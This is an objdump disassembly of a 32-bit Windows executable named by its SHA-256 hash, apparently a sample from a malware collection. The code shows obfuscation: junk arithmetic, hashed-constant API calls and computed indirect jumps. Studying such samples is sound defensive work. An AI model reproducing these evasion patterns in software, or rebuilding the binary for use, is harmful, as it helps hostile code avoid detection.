
65dea5696459ce41055d21206ee52092795aa2b93b0bf887bcae2a71dc2a6688.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	push   ebp
  402001:	mov    ebp,esp
  402003:	sub    esp,0xc
  402006:	mov    DWORD PTR ds:0x43b0a5,0x9a0
  402010:	push   edi
  402011:	push   esi
  402012:	push   0x0
  402014:	call   DWORD PTR ds:0x41802c
  40201a:	mov    ds:0x43b577,eax
  40201f:	push   0x72833900
  402024:	push   0x78c80600
  402029:	push   0x505d800
  40202e:	push   0x0
  402030:	push   0x0
  402032:	push   0x0
  402034:	call   DWORD PTR ds:0x418000
  40203a:	mov    ds:0x43b298,eax
  40203f:	or     eax,eax
  402041:	jne    0x402ba9
  402047:	push   0xa805
  40204c:	push   eax
  40204d:	call   0x402d3c
  402052:	mov    DWORD PTR [ebp-0xc],eax
  402055:	push   0x0
  402057:	call   DWORD PTR ds:0x41802c
  40205d:	mov    DWORD PTR [ebp-0x4],eax
  402060:	or     eax,eax
  402062:	je     0x402b7d
  402068:	rol    eax,0x6
  40206b:	inc    DWORD PTR ds:0x43b44a
  402071:	and    eax,0x54
  402076:	push   eax
  402077:	sub    DWORD PTR ds:0x43b6a5,eax
  40207d:	pop    edi
  40207e:	push   edi
  40207f:	lea    eax,ds:0x43b4ad
  402085:	push   eax
  402086:	call   0x402d3c
  40208b:	mov    ds:0x43b557,eax
  402090:	call   0x40385c
  402095:	mov    DWORD PTR [ebp-0x4],eax
  402098:	push   0xed3b
  40209d:	push   0x43b06e
  4020a2:	call   0x402f48
  4020a7:	or     al,al
  4020a9:	je     0x4020b3
  4020ab:	setno  cl
  4020ae:	xor    ebx,edi
  4020b0:	add    ecx,edi
  4020b2:	dec    esi
  4020b3:	mov    ds:0x43b6fb,eax
  4020b8:	push   0x0
  4020ba:	push   0x0
  4020bc:	call   DWORD PTR ds:0x418084
  4020c2:	mov    ds:0x43b870,eax
  4020c7:	push   0xa6ac3
  4020cc:	pop    ebx
  4020cd:	mov    edi,0x1d47
  4020d2:	add    ebx,edi
  4020d4:	dec    DWORD PTR ds:0x43b398
  4020da:	shl    ebx,0x3
  4020dd:	push   ebx
  4020de:	mov    DWORD PTR [ebp-0x8],ebx
  4020e1:	pop    DWORD PTR ds:0x43b775
  4020e7:	lea    ebx,[esi+esi*8+0x181e]
  4020ee:	shl    ebx,0x6
  4020f1:	push   0x8c3a4
  4020f6:	pop    DWORD PTR ds:0x43b14e
  4020fc:	mov    edi,0x61379
  402101:	xor    ebx,edi
  402103:	mov    DWORD PTR ds:0x43b7df,ebx
  402109:	mov    DWORD PTR [ebp-0x8],ebx
  40210c:	add    eax,0x9bb0
  402111:	mov    edi,0xff5b7
  402116:	ror    edi,0x3
  402119:	mov    DWORD PTR ds:0x43b490,edi
  40211f:	add    DWORD PTR ds:0x43b239,edi
  402125:	mov    ebx,0x0
  40212a:	push   ebx
  40212b:	add    ebx,DWORD PTR ds:0x43b8ae
  402131:	mov    DWORD PTR [ebp-0x8],ebx
  402134:	mov    DWORD PTR [ebp-0x8],ebx
  402137:	pop    DWORD PTR ds:0x43b4d8
  40213d:	cmp    eax,0x9c07
  402142:	jne    0x402ba7
  402148:	lea    eax,ds:0x43b794
  40214e:	push   eax
  40214f:	push   0x862a
  402154:	lea    eax,ds:0x43b61c
  40215a:	push   eax
  40215b:	push   0x0
  40215d:	call   0x402f9c
  402162:	or     al,al
  402164:	jne    0x40216e
  402166:	sub    eax,DWORD PTR ds:0x444071
  40216c:	add    eax,ebx
  40216e:	mov    ds:0x43b5ae,eax
  402173:	or     edi,0xc
  402176:	add    esi,eax
  402178:	inc    eax
  402179:	mov    ebx,edi
  40217b:	push   edi
  40217c:	call   0x403204
  402181:	mov    ds:0x43b76a,eax
  402186:	push   esi
  402187:	push   0xcab4
  40218c:	push   0xeb05
  402191:	push   0x0
  402193:	call   0x402f9c
  402198:	or     al,al
  40219a:	je     0x4021a5
  40219c:	mov    eax,0xf2
  4021a1:	dec    eax
  4021a2:	mov    DWORD PTR [ebp-0x4],ebx
  4021a5:	mov    ds:0x43b53d,eax
  4021aa:	mov    ds:0x43b440,eax
  4021af:	push   eax
  4021b0:	push   DWORD PTR ds:0x43b5a2
  4021b6:	push   DWORD PTR ds:0x43b064
  4021bc:	call   0x4038f7
  4021c1:	mov    edi,0x219
  4021c6:	sub    eax,edi
  4021c8:	add    DWORD PTR ds:0x43b6eb,eax
  4021ce:	ror    eax,0x2
  4021d1:	push   eax
  4021d2:	sub    DWORD PTR ds:0x43b436,eax
  4021d8:	pop    eax
  4021d9:	push   DWORD PTR ds:0x43b660
  4021df:	sub    ebx,esi
  4021e1:	or     edi,0x46
  4021e4:	dec    esi
  4021e5:	lea    eax,ds:0x43b464
  4021eb:	push   eax
  4021ec:	push   DWORD PTR ds:0x43b0b8
  4021f2:	call   0x403568
  4021f7:	mov    DWORD PTR [ebp-0x4],eax
  4021fa:	push   DWORD PTR ds:0x43b14b
  402200:	push   0xa87d
  402205:	lea    eax,ds:0x43b031
  40220b:	push   eax
  40220c:	call   0x4034f8
  402211:	mov    DWORD PTR [ebp-0x4],eax
  402214:	lea    eax,ds:0x43b61d
  40221a:	push   eax
  40221b:	lea    eax,ds:0x43b6c6
  402221:	push   eax
  402222:	call   0x402f48
  402227:	test   al,al
  402229:	je     0x402234
  40222b:	lea    ebx,ds:0x4
  402231:	or     eax,0x22
  402234:	mov    ds:0x43b8b0,eax
  402239:	push   0x43b659
  40223e:	call   DWORD PTR ds:0x418094
  402244:	mov    ds:0x43b483,eax
  402249:	or     eax,eax
  40224b:	jne    0x402bda
  402251:	push   esi
  402252:	push   0x4ac4
  402257:	sub    edi,0x2
  40225d:	push   esi
  40225e:	push   0xc9b
  402263:	call   0x40327c
  402268:	mov    ds:0x43b75a,eax
  40226d:	cmp    edi,DWORD PTR ds:0x47e860
  402273:	add    ebx,eax
  402275:	inc    edi
  402276:	push   0x0
  402278:	push   0x0
  40227a:	push   DWORD PTR ds:0x43b622
  402280:	push   0x0
  402282:	push   0xadec
  402287:	push   DWORD PTR ds:0x43b640
  40228d:	call   0x403608
  402292:	mov    DWORD PTR [ebp-0x8],eax
  402295:	push   DWORD PTR ds:0x43b235
  40229b:	push   edi
  40229c:	lea    eax,ds:0x43b268
  4022a2:	push   eax
  4022a3:	push   0x0
  4022a5:	call   0x402db8
  4022aa:	mov    ds:0x43b72a,eax
  4022af:	lea    eax,ds:0x43b5da
  4022b5:	push   eax
  4022b6:	push   DWORD PTR ds:0x43b1ca
  4022bc:	push   0x8ff2
  4022c1:	call   0x4034f8
  4022c6:	mov    DWORD PTR [ebp-0x8],eax
  4022c9:	push   0x5e3ded00
  4022ce:	push   0x29388900
  4022d3:	push   0x1fabce00
  4022d8:	push   0x44de5e00
  4022dd:	call   DWORD PTR ds:0x4180a0
  4022e3:	mov    ds:0x43b144,eax
  4022e8:	inc    eax
  4022e9:	jne    0x402ba7
  4022ef:	push   0x567f
  4022f4:	call   0x403404
  4022f9:	or     al,al
  4022fb:	je     0x402306
  4022fd:	add    eax,0x1
  402303:	dec    esi
  402304:	dec    eax
  402305:	dec    esi
  402306:	mov    DWORD PTR [ebp-0x8],eax
  402309:	push   0x43b0e0
  40230e:	push   0x43b05d
  402313:	push   0x7
  402315:	call   DWORD PTR ds:0x418044
  40231b:	mov    ds:0x43b6a7,eax
  402320:	or     eax,eax
  402322:	je     0x402ba7
  402328:	push   DWORD PTR ds:0x43b2b3
  40232e:	push   DWORD PTR ds:0x43b30c
  402334:	or     eax,0x78
  402337:	add    eax,edi
  402339:	push   DWORD PTR ds:0x43b02c
  40233f:	push   0x0
  402341:	lea    esi,[edi+0x4]
  402347:	or     esi,0x3e
  40234a:	push   esi
  40234b:	push   0x43b237
  402350:	call   0x403608
  402355:	mov    ds:0x43b358,eax
  40235a:	mov    DWORD PTR [ebp-0x4],ebx
  40235d:	and    ebx,edi
  40235f:	add    ebx,edi
  402361:	push   0x43b4b9
  402366:	push   0x0
  402368:	call   0x403308
  40236d:	mov    ds:0x43b4be,eax
  402372:	push   0x61d0
  402377:	lea    eax,ds:0x43b0f9
  40237d:	push   eax
  40237e:	call   0x4036b0
  402383:	mov    DWORD PTR [ebp-0x4],eax
  402386:	push   0x43b4e4
  40238b:	call   DWORD PTR ds:0x418094
  402391:	mov    ds:0x43b3dc,eax
  402396:	or     eax,eax
  402398:	jne    0x402bde
  40239e:	push   0x0
  4023a0:	push   0x0
  4023a2:	push   DWORD PTR ds:0x43b8a7
  4023a8:	call   0x403568
  4023ad:	test   al,al
  4023af:	je     0x4023ba
  4023b1:	add    edi,ebx
  4023b3:	mov    ebx,0x4c
  4023b8:	add    edi,ebx
  4023ba:	mov    ds:0x43b681,eax
  4023bf:	push   0x495b4500
  4023c4:	push   0x125bdf00
  4023c9:	push   0x6ec3500
  4023ce:	call   DWORD PTR ds:0x418098
  4023d4:	mov    ds:0x43b245,eax
  4023d9:	mov    DWORD PTR [ebp-0xc],eax
  4023dc:	sub    eax,DWORD PTR ds:0x43b44f
  4023e2:	push   eax
  4023e3:	mov    ds:0x43b344,eax
  4023e8:	pop    eax
  4023e9:	push   0x0
  4023eb:	push   0x0
  4023ed:	push   0x0
  4023ef:	call   DWORD PTR ds:0x418018
  4023f5:	mov    ds:0x43b437,eax
  4023fa:	or     eax,eax
  4023fc:	jne    0x402b72
  402402:	push   0x43b4eb
  402407:	push   0x43b895
  40240c:	push   0x1
  40240e:	call   DWORD PTR ds:0x418044
  402414:	mov    ds:0x43b521,eax
  402419:	or     eax,eax
  40241b:	je     0x402b7d
  402421:	push   0x43b6ef
  402426:	push   0x43b70e
  40242b:	push   0x5
  40242d:	call   DWORD PTR ds:0x418044
  402433:	mov    ds:0x43b14e,eax
  402438:	mov    DWORD PTR [ebp-0x8],eax
  40243b:	xor    esi,esi
  40243d:	shr    esi,1
  40243f:	add    DWORD PTR ds:0x43b398,esi
  402445:	mov    ebx,0x1937
  40244a:	imul   esi,ebx,0x1d
  40244d:	push   esi
  40244e:	add    DWORD PTR ds:0x43b2cc,esi
  402454:	pop    DWORD PTR ds:0x43b414
  40245a:	push   0x0
  40245c:	push   0x0
  40245e:	push   0x630a
  402463:	push   0x43b82d
  402468:	push   edi
  402469:	lea    eax,ds:0x43b17c
  40246f:	push   eax
  402470:	mov    edx,0x13ce
  402475:	push   eax
  402476:	lea    eax,ds:0x43b8a2
  40247c:	push   eax
  40247d:	mov    ecx,0x89
  402482:	mov    eax,ecx
  402484:	sbb    edi,esi
  402486:	push   0x43b4bb
  40248b:	push   0x43b5cf
  402490:	call   0x403054
  402495:	mov    DWORD PTR [ebp-0x4],eax
  402498:	sub    edx,0x58d
  40249e:	lea    eax,ds:0x43b19f
  4024a4:	push   eax
  4024a5:	push   DWORD PTR ds:0x43b7cc
  4024ab:	push   DWORD PTR ds:0x43b4e7
  4024b1:	push   0x43b354
  4024b6:	sub    edi,0x1
  4024bc:	xor    eax,ebx
  4024be:	lea    eax,ds:0x43b0c6
  4024c4:	push   eax
  4024c5:	call   0x402c20
  4024ca:	mov    DWORD PTR [ebp-0x8],eax
  4024cd:	sub    edx,0x752
  4024d3:	mov    ebx,0x23
  4024d8:	add    ebx,edi
  4024da:	dec    esi
  4024db:	mov    ebx,esi
  4024dd:	mov    edi,esi
  4024df:	dec    ebx
  4024e0:	push   DWORD PTR ds:0x43b8d3
  4024e6:	call   0x4033a0
  4024eb:	mov    ds:0x43b36e,eax
  4024f0:	sub    edx,0x5bf
  4024f6:	push   0x2fe9
  4024fb:	push   0x7d7a
  402500:	push   ebx
  402501:	push   0x60bf
  402506:	lea    edi,ds:0x5
  40250c:	add    edi,esi
  40250e:	lea    eax,ds:0x7
  402514:	push   0x43b615
  402519:	push   DWORD PTR ds:0x43b877
  40251f:	call   0x403748
  402524:	mov    DWORD PTR [ebp-0xc],eax
  402527:	sub    edx,0xf0
  40252d:	lea    edi,[eax+edi*2+0x195f]
  402534:	add    edi,0x62
  402537:	push   edi
  402538:	mov    DWORD PTR ds:0x43b34b,edi
  40253e:	pop    DWORD PTR ds:0x43b1ea
  402544:	push   0x9d
  402549:	call   0x402c98
  40254e:	mov    ds:0x43b7d3,eax
  402553:	shl    edx,0x10
  402556:	push   0x6582
  40255b:	call   0x4033a0
  402560:	mov    DWORD PTR [ebp-0x4],eax
  402563:	push   DWORD PTR ds:0x43b26c
  402569:	push   0x43b82f
  40256e:	lea    eax,ds:0x43b455
  402574:	push   eax
  402575:	push   0x0
  402577:	push   0x0
  402579:	push   0x0
  40257b:	call   0x403748
  402580:	mov    DWORD PTR [ebp-0x4],eax
  402583:	add    edx,0x3d64
  402589:	mov    edi,0x0
  40258e:	and    edi,0x504e2600
  402594:	push   edi
  402595:	sub    DWORD PTR ds:0x43b348,edi
  40259b:	pop    eax
  40259c:	call   edx
  40259e:	or     eax,eax
  4025a0:	je     0x402b78
  4025a6:	mov    ebx,eax
  4025a8:	push   0x0
  4025aa:	call   0x403404
  4025af:	test   al,al
  4025b1:	jne    0x4025bb
  4025b3:	add    esi,edi
  4025b5:	sub    eax,edi
  4025b7:	mov    edi,esi
  4025b9:	dec    edi
  4025ba:	dec    edi
  4025bb:	mov    ds:0x43b876,eax
  4025c0:	sub    esi,eax
  4025c2:	mov    edi,esi
  4025c4:	dec    esi
  4025c5:	lea    eax,ds:0x43b7b3
  4025cb:	push   eax
  4025cc:	push   DWORD PTR ds:0x43b45f
  4025d2:	push   DWORD PTR ds:0x43b37c
  4025d8:	push   0x62be
  4025dd:	call   0x402db8
  4025e2:	mov    ds:0x43b3c1,eax
  4025e7:	push   0x0
  4025e9:	call   DWORD PTR ds:0x41802c
  4025ef:	mov    ds:0x43b30a,eax
  4025f4:	or     eax,eax
  4025f6:	je     0x402b7b
  4025fc:	push   esi
  4025fd:	push   0x0
  4025ff:	push   0x8e8d
  402604:	call   0x403568
  402609:	or     al,al
  40260b:	jne    0x402616
  40260d:	mov    DWORD PTR [ebp-0xc],ebx
  402610:	lea    eax,ds:0x73
  402616:	mov    ds:0x43b178,eax
  40261b:	push   0x3735d00
  402620:	push   0x30f33800
  402625:	push   0x376dd600
  40262a:	call   DWORD PTR ds:0x418098
  402630:	mov    DWORD PTR [ebp-0xc],eax
  402633:	inc    eax
  402634:	jne    0x402b7d
  40263a:	push   eax
  40263b:	and    eax,0x46
  402640:	push   0x7d
  402642:	pop    DWORD PTR ds:0x43b869
  402648:	sub    DWORD PTR ds:0x43b223,eax
  40264e:	pop    DWORD PTR ds:0x43b51e
  402654:	push   0x2c187900
  402659:	push   0x494a4100
  40265e:	push   0x5e599a00
  402663:	push   0x515c3300
  402668:	push   0x65a31f00
  40266d:	call   DWORD PTR ds:0x418090
  402673:	mov    ds:0x43b5f7,eax
  402678:	inc    eax
  402679:	jne    0x402ba7
  40267f:	push   DWORD PTR ds:0x43b6d6
  402685:	lea    eax,ds:0xd
  40268b:	inc    edi
  40268c:	push   edi
  40268d:	call   0x4036b0
  402692:	mov    ds:0x43b85f,eax
  402697:	push   0x66f39c00
  40269c:	push   0x2a62f900
  4026a1:	push   0x35103800
  4026a6:	call   DWORD PTR ds:0x418098
  4026ac:	mov    DWORD PTR [ebp-0xc],eax
  4026af:	mov    ds:0x43b42d,eax
  4026b4:	push   0x0
  4026b6:	call   0x402c98
  4026bb:	mov    ds:0x43b8d3,eax
  4026c0:	push   esi
  4026c1:	call   0x403404
  4026c6:	or     al,al
  4026c8:	je     0x4026d2
  4026ca:	not    esi
  4026cc:	mov    edx,0x5b
  4026d1:	inc    edi
  4026d2:	mov    ds:0x43b745,eax
  4026d7:	push   0x43b472
  4026dc:	push   0x0
  4026de:	push   0x2952
  4026e3:	push   0x43b59d
  4026e8:	call   0x403054
  4026ed:	test   al,al
  4026ef:	jne    0x4026fa
  4026f1:	mov    DWORD PTR [ebp-0x4],edi
  4026f4:	or     eax,0x3b
  4026f7:	xchg   esi,esi
  4026f9:	dec    esi
  4026fa:	mov    ds:0x43b7e0,eax
  4026ff:	push   0x29737100
  402704:	push   0x46356500
  402709:	push   0x40b23700
  40270e:	push   0x52e7e600
  402713:	call   DWORD PTR ds:0x4180a0
  402719:	mov    ds:0x43b894,eax
  40271e:	mov    ds:0x43b70b,eax
  402723:	push   0x6f6bbe00
  402728:	push   0x38041300
  40272d:	push   0x5dc30300
  402732:	call   DWORD PTR ds:0x418098
  402738:	mov    DWORD PTR [ebp-0x8],eax
  40273b:	inc    eax
  40273c:	jne    0x402ba7
  402742:	push   0x5d3a1b00
  402747:	push   0x135fbd00
  40274c:	push   0x3b730400
  402751:	push   0x4dab5500
  402756:	push   0x71ec3d00
  40275b:	call   DWORD PTR ds:0x418090
  402761:	mov    DWORD PTR [ebp-0xc],eax
  402764:	inc    eax
  402765:	jne    0x402b70
  40276b:	push   0x0
  40276d:	push   0x39eb
  402772:	call   0x403308
  402777:	mov    ds:0x43b7e0,eax
  40277c:	push   DWORD PTR ds:0x43b13e
  402782:	lea    eax,ds:0x43b690
  402788:	push   eax
  402789:	push   DWORD PTR ds:0x43b495
  40278f:	push   DWORD PTR ds:0x43b7fe
  402795:	call   0x40327c
  40279a:	mov    DWORD PTR [ebp-0x4],eax
  40279d:	push   DWORD PTR ds:0x43b0bb
  4027a3:	push   0xd020
  4027a8:	push   0x0
  4027aa:	push   0x43b583
  4027af:	push   0x0
  4027b1:	call   0x4030f4
  4027b6:	or     al,al
  4027b8:	jne    0x4027c3
  4027ba:	inc    esi
  4027bb:	add    eax,0x1
  4027c1:	xor    eax,ebx
  4027c3:	mov    DWORD PTR [ebp-0x4],eax
  4027c6:	lea    eax,ds:0x43b28b
  4027cc:	push   eax
  4027cd:	push   DWORD PTR ds:0x43b486
  4027d3:	push   0xa9ec
  4027d8:	lea    eax,ds:0x43b1a5
  4027de:	push   eax
  4027df:	push   0x43b22d
  4027e4:	lea    eax,ds:0x43b47c
  4027ea:	push   eax
  4027eb:	call   0x403608
  4027f0:	mov    DWORD PTR [ebp-0x8],eax
  4027f3:	push   DWORD PTR ds:0x43b3b7
  4027f9:	call   0x4037c4
  4027fe:	mov    DWORD PTR [ebp-0x4],eax
  402801:	push   0x43b0e7
  402806:	call   DWORD PTR ds:0x418094
  40280c:	mov    DWORD PTR [ebp-0xc],eax
  40280f:	or     eax,eax
  402811:	jne    0x402ba9
  402817:	push   ebx
  402818:	call   0x403404
  40281d:	mov    ds:0x43b1a9,eax
  402822:	not    edi
  402824:	inc    eax
  402825:	xor    eax,ebp
  402827:	inc    eax
  402828:	lea    eax,ds:0x43b1cd
  40282e:	push   eax
  40282f:	lea    eax,ds:0x43b445
  402835:	push   eax
  402836:	mov    edx,0x861b
  40283b:	lea    edi,[ebx+0xbb]
  402841:	rol    edi,0x7
  402844:	push   edi
  402845:	add    DWORD PTR ds:0x43b53e,edi
  40284b:	add    DWORD PTR ds:0x43b1a6,edi
  402851:	pop    DWORD PTR ds:0x43b495
  402857:	push   0xf3f2
  40285c:	push   0x43b058
  402861:	call   0x402e00
  402866:	or     al,al
  402868:	jne    0x402870
  40286a:	add    edi,esi
  40286c:	mov    DWORD PTR [ebp-0x4],eax
  40286f:	inc    edi
  402870:	mov    ds:0x43b4e5,eax
  402875:	add    edx,0xd6f
  40287b:	push   0x0
  40287d:	push   DWORD PTR ds:0x43b2c2
  402883:	call   0x402e00
  402888:	mov    ds:0x43b0f0,eax
  40288d:	push   0x43b65b
  402892:	push   DWORD PTR ds:0x43b1de
  402898:	push   DWORD PTR ds:0x43b52c
  40289e:	push   0x43b1a8
  4028a3:	push   0xa9a8
  4028a8:	add    eax,ebx
  4028aa:	xor    eax,ebp
  4028ac:	dec    edi
  4028ad:	push   0x43b4f5
  4028b2:	call   0x402ea8
  4028b7:	mov    DWORD PTR [ebp-0x8],eax
  4028ba:	add    edx,0x273
  4028c0:	push   0x0
  4028c2:	push   ebx
  4028c3:	lea    eax,ds:0x43b4a9
  4028c9:	push   eax
  4028ca:	push   0x1728
  4028cf:	push   0xb399
  4028d4:	call   0x4030f4
  4028d9:	test   al,al
  4028db:	jne    0x4028e3
  4028dd:	mov    esi,0x7f
  4028e2:	dec    edi
  4028e3:	mov    ds:0x43b676,eax
  4028e8:	sub    edx,0xf3f
  4028ee:	mov    esi,ebx
  4028f0:	rol    DWORD PTR ds:0x43b1c0,0x2
  4028f7:	add    DWORD PTR ds:0x43b272,esi
  4028fd:	push   esi
  4028fe:	call   0x4037c4
  402903:	mov    DWORD PTR [ebp-0x8],eax
  402906:	sub    edx,0x2e4
  40290c:	or     esi,0x59
  40290f:	inc    eax
  402910:	push   0x1c62
  402915:	push   DWORD PTR ds:0x43b544
  40291b:	lea    eax,ds:0x43b2bd
  402921:	push   eax
  402922:	push   0x0
  402924:	push   0x0
  402926:	push   0x43b664
  40292b:	call   0x402ea8
  402930:	mov    ds:0x43b2c0,eax
  402935:	sub    edx,0x839a
  40293b:	mov    esi,0x0
  402940:	sub    esi,DWORD PTR ds:0x43b26e
  402946:	mov    DWORD PTR ds:0x43b39d,esi
  40294c:	mov    DWORD PTR ds:0x43b73f,esi
  402952:	push   0x43b6db
  402957:	push   0xbde6
  40295c:	push   0x0
  40295e:	push   DWORD PTR ds:0x43b4e9
  402964:	push   ebx
  402965:	push   0x43b421
  40296a:	call   0x402ea8
  40296f:	mov    ds:0x43b328,eax
  402974:	shl    edx,0x10
  402977:	push   0xd0b0
  40297c:	call   0x402c98
  402981:	mov    ds:0x43b085,eax
  402986:	push   0x7568
  40298b:	push   0x43b727
  402990:	push   0x0
  402992:	push   0x43b6de
  402997:	push   esi
  402998:	push   DWORD PTR ds:0x43b742
  40299e:	call   0x402ea8
  4029a3:	mov    DWORD PTR [ebp-0x8],eax
  4029a6:	add    edx,0x392c
  4029ac:	call   0x40385c
  4029b1:	mov    ds:0x43b43d,eax
  4029b6:	push   0x93d4
  4029bb:	push   0x9aef
  4029c0:	push   DWORD PTR ds:0x43b2ad
  4029c6:	call   0x403488
  4029cb:	mov    DWORD PTR [ebp-0xc],eax
  4029ce:	call   edx
  4029d0:	push   esi
  4029d1:	push   edi
  4029d2:	call   0x40385c
  4029d7:	mov    DWORD PTR [ebp-0x8],eax
  4029da:	push   eax
  4029db:	mov    eax,esi
  4029dd:	mov    edi,ebx
  4029df:	or     ebx,0x10
  4029e2:	add    eax,esi
  4029e4:	push   0xd0e4
  4029e9:	sub    esi,0x2
  4029ef:	cwde   
  4029f0:	push   edi
  4029f1:	push   0x43b77b
  4029f6:	call   0x403054
  4029fb:	test   al,al
  4029fd:	je     0x402a05
  4029ff:	mov    DWORD PTR [ebp-0x8],esi
  402a02:	or     edi,0x2a
  402a05:	mov    ds:0x43b5d9,eax
  402a0a:	lea    eax,ds:0x43b1ed
  402a10:	push   eax
  402a11:	call   0x402c98
  402a16:	mov    ds:0x43b5de,eax
  402a1b:	xor    esi,esi
  402a1d:	push   esi
  402a1e:	inc    esi
  402a1f:	mov    DWORD PTR [ebp-0xc],esi
  402a22:	sub    DWORD PTR ds:0x43b630,esi
  402a28:	pop    DWORD PTR ds:0x43b44d
  402a2e:	lea    eax,ds:0x43b490
  402a34:	push   eax
  402a35:	push   0x43b756
  402a3a:	push   0x73c5
  402a3f:	push   0x43b477
  402a44:	call   0x402f9c
  402a49:	mov    DWORD PTR [ebp-0x8],eax
  402a4c:	push   DWORD PTR ds:0x43b48b
  402a52:	push   DWORD PTR ds:0x43b177
  402a58:	lea    eax,ds:0x43b15c
  402a5e:	push   eax
  402a5f:	lea    eax,ds:0x43b536
  402a65:	push   eax
  402a66:	push   DWORD PTR ds:0x43b8df
  402a6c:	push   DWORD PTR ds:0x43b6c8
  402a72:	call   0x402ea8
  402a77:	mov    DWORD PTR [ebp-0x4],eax
  402a7a:	lea    eax,ds:0x43b0c6
  402a80:	push   eax
  402a81:	lea    eax,ds:0x43b111
  402a87:	push   eax
  402a88:	call   0x402e00
  402a8d:	mov    ds:0x43b720,eax
  402a92:	push   0x0
  402a94:	mov    DWORD PTR [ebp-0x4],0x1c
  402a9b:	push   eax
  402a9c:	push   0x0
  402a9e:	call   0x403180
  402aa3:	mov    DWORD PTR [ebp-0x8],eax
  402aa6:	push   esi
  402aa7:	push   esi
  402aa8:	call   0x402d3c
  402aad:	mov    ds:0x43b50a,eax
  402ab2:	push   0x43b846
  402ab7:	push   0x43b101
  402abc:	call   0x402e00
  402ac1:	mov    ds:0x43b348,eax
  402ac6:	push   DWORD PTR ds:0x43b7f6
  402acc:	call   0x402c98
  402ad1:	mov    ds:0x43b263,eax
  402ad6:	push   DWORD PTR ds:0x43b856
  402adc:	push   0x43b3d5
  402ae1:	mov    edi,0x39
  402ae6:	push   0x0
  402ae8:	push   DWORD PTR ds:0x43b87c
  402aee:	call   0x403054
  402af3:	test   al,al
  402af5:	jne    0x402afe
  402af7:	lea    eax,[ebx+0x0]
  402afd:	dec    edi
  402afe:	mov    ds:0x43b7f2,eax
  402b03:	ret    
  402b04:	idiv   BYTE PTR [edx+0x56]
  402b07:	dec    edi
  402b08:	sub    al,dl
  402b0a:	add    al,0x83
  402b0c:	into   
  402b0d:	lea    ebp,fs:[eax+0xd]
  402b14:	inc    esi
  402b15:	lea    ebp,ds:0xc
  402b1b:	xchg   esi,ebx
  402b1d:	sub    esi,0x2
  402b23:	add    ebp,esi
  402b25:	sub    ebp,DWORD PTR ds:0x45bc06
  402b2b:	sub    esi,0x2
  402b31:	lea    esi,[edi+0x16]
  402b37:	or     eax,0x27
  402b3a:	lea    edx,[esi+0x4]
  402b40:	mov    DWORD PTR [ebp-0x4],edi
  402b43:	dec    ebp
  402b44:	add    edi,ebx
  402b46:	sub    esi,0x2
  402b4c:	dec    edi
  402b4d:	mov    esi,edx
  402b4f:	sub    ebp,0x2
  402b55:	add    esi,0x2
  402b5b:	neg    ebp
  402b5d:	mov    eax,edx
  402b5f:	sub    edi,0x2
  402b65:	add    esi,0x2
  402b6b:	add    edi,ebx
  402b6d:	add    edx,edi
  402b6f:	dec    ebx
  402b70:	mov    edi,esi
  402b72:	add    edi,0x2
  402b78:	mov    esi,ebx
  402b7a:	dec    ebx
  402b7b:	mov    ecx,edi
  402b7d:	sub    esi,edi
  402b7f:	push   0x41138e00
  402b84:	push   0x20323100
  402b89:	push   0x72317700
  402b8e:	push   0x411efd00
  402b93:	call   DWORD PTR ds:0x4180a0
  402b99:	mov    ds:0x43b7b0,eax
  402b9e:	inc    eax
  402b9f:	jne    0x402b7d
  402ba5:	leave  
  402ba6:	ret    
  402ba7:	mov    edi,eax
  402ba9:	add    esi,ebx
  402bab:	push   0x7a468900
  402bb0:	call   DWORD PTR ds:0x41809c
  402bb6:	mov    ds:0x43b7ef,eax
  402bbb:	mov    ds:0x43b3ee,eax
  402bc0:	push   0x0
  402bc2:	call   DWORD PTR ds:0x41802c
  402bc8:	mov    ds:0x43b594,eax
  402bcd:	or     eax,eax
  402bcf:	je     0x402b7a
  402bd5:	xor    ah,ch
  402bd7:	xor    eax,0xf7037ed6
  402bdc:	mov    edx,ebx
  402bde:	mov    eax,edx
  402be0:	push   0x43b26d
  402be5:	push   0x43b68b
  402bea:	push   0x7
  402bec:	call   DWORD PTR ds:0x418044
  402bf2:	mov    ds:0x43b064,eax
  402bf7:	or     eax,eax
  402bf9:	je     0x402b78
  402bff:	cmp    eax,0x82890651
  402c04:	sar    DWORD PTR [ebx+0x5d],0x43
  402c08:	fnsave [ebx-0xe9762f1]
  402c0e:	push   0x3c78b37
  402c13:	test   DWORD PTR [ecx+0x1ee],0x43e88b00
  402c1d:	jg     0x402c41
  402c1f:	ret    0x8b55
  402c22:	in     al,dx
  402c23:	sub    esp,0x14
  402c26:	push   ecx
  402c27:	push   edx
  402c28:	push   0x43b234
  402c2d:	push   0x43b1c5
  402c32:	push   0x1
  402c34:	call   DWORD PTR ds:0x418044
  402c3a:	mov    DWORD PTR [ebp-0x10],eax
  402c3d:	mov    DWORD PTR [ebp-0x10],eax
  402c40:	mov    esi,DWORD PTR [ebp+0x8]
  402c43:	inc    esi
  402c44:	mov    DWORD PTR [ebp+0x14],esi
  402c47:	sub    DWORD PTR ds:0x43b044,esi
  402c4d:	mov    eax,DWORD PTR [ebp+0x14]
  402c50:	mov    esi,0x9c7bc
  402c55:	xor    eax,esi
  402c57:	push   eax
  402c58:	mov    esi,0x16d4
  402c5d:	add    eax,esi
  402c5f:	mov    DWORD PTR [ebp-0x8],eax
  402c62:	add    DWORD PTR ds:0x43b285,eax
  402c68:	pop    eax
  402c69:	mov    esi,DWORD PTR [ebp+0xc]
  402c6c:	add    esi,0x28c1c
  402c72:	add    DWORD PTR ds:0x43b813,esi
  402c78:	inc    esi
  402c79:	push   esi
  402c7a:	mov    DWORD PTR [ebp-0x8],esi
  402c7d:	pop    DWORD PTR ds:0x43b086
  402c83:	cmp    esi,0x23a
  402c89:	pop    edx
  402c8a:	pop    ecx
  402c8b:	sete   al
  402c8e:	mov    esp,ebp
  402c90:	pop    ebp
  402c91:	ret    0x14
  402c94:	inc    DWORD PTR [ebp+0x60]
  402c97:	and    eax,0x3c685251
  402c9c:	mov    bl,0x43
  402c9e:	add    BYTE PTR [eax-0x4c],ch
  402ca1:	mov    ch,0x43
  402ca3:	add    BYTE PTR [edx+0x9],ch
  402ca6:	call   DWORD PTR ds:0x418044
  402cac:	mov    ds:0x43b617,eax
  402cb1:	mov    ds:0x43b16f,eax
  402cb6:	call   DWORD PTR ds:0x418028
  402cbc:	mov    ds:0x43b484,eax
  402cc1:	mov    ds:0x43b809,eax
  402cc6:	mov    esi,DWORD PTR [ebp+0x8]
  402cc9:	mov    eax,0x8be
  402cce:	add    esi,eax
  402cd0:	mov    DWORD PTR [ebp+0x8],esi
